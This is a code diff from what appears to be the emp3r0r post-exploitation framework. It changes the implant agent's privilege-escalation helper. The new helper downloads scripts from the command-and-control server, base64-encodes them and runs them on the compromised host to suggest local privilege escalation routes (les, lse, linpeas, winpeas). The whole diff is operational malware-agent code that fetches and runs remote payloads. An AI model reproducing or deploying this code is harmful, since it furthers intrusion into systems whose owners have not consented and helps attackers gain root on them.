@@ -4,10 +4,10 @@
 package agent
 
 import (
+	"encoding/base64"
 	"fmt"
 	"log"
 	"os"
-	"os/exec"
 	"strings"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -46,26 +46,32 @@ func GetRoot() error {
 	return golpe.RunAll()
 }
 
-// lpeHelper runs les and upc to suggest LPE methods
-func lpeHelper(method string) string {
-	log.Printf("Downloading lpe script from %s", emp3r0r_data.CCAddress+method)
+// runLPEHelper runs helper scripts to give you hints on how to escalate privilege
+func runLPEHelper(method string) (out string) {
+	log.Printf("Downloading LPE script from %s", emp3r0r_data.CCAddress+method)
 	var scriptData []byte
 	scriptData, err := DownloadViaCC(method, "")
 	if err != nil {
-		return "LPE error: " + err.Error()
+		return "Download error: " + err.Error()
 	}
+	encoded_script := base64.StdEncoding.EncodeToString(scriptData)
 
 	// run the script
-	log.Println("Running LPE suggest")
-	cmd := exec.Command("/bin/bash", "-c", string(scriptData))
-	if method == "lpe_lse" {
-		cmd = exec.Command("/bin/bash", "-c", string(scriptData), "-i")
+	log.Printf("Running LPE helper %s", method)
+	args := ""
+	switch method {
+	case "lpe_les":
+	case "lpe_lse":
+		args = "-i"
+	case "lpe_linpeas":
+	case "lpe_winpeas":
 	}
 
-	outBytes, err := cmd.CombinedOutput()
+	// collect output
+	out, err = RunScript(encoded_script, args)
 	if err != nil {
-		return "LPE error: " + string(outBytes)
+		return "LPE error: " + string(out)
 	}
 
-	return string(outBytes)
+	return out
 }
